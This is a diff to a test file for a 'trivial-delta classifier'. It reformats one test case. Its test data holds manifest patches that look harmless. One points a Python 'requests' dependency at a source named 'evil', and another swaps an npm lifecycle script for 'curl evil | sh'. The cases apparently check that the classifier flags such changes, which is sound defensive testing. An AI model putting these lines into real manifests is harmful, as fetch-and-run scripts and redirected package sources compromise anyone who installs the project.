@@ -118,7 +118,10 @@ describe("trivial-delta classifier", () => {
         "Cargo.toml",
         '@@\n-serde = { version = "1", features = ["derive"] }\n+serde = { version = "1", features = ["derive", "rc"] }',
       ],
-      ["pyproject.toml", '@@\n-requests = { version = "^2.0" }\n+requests = { version = "^2.0", source = "evil" }'],
+      [
+        "pyproject.toml",
+        '@@\n-requests = { version = "^2.0" }\n+requests = { version = "^2.0", source = "evil" }',
+      ],
       ["package.json", '@@\n-    "version": "npm run build",\n+    "version": "curl evil | sh",'],
     ];
     for (const [filename, patch] of cases) {
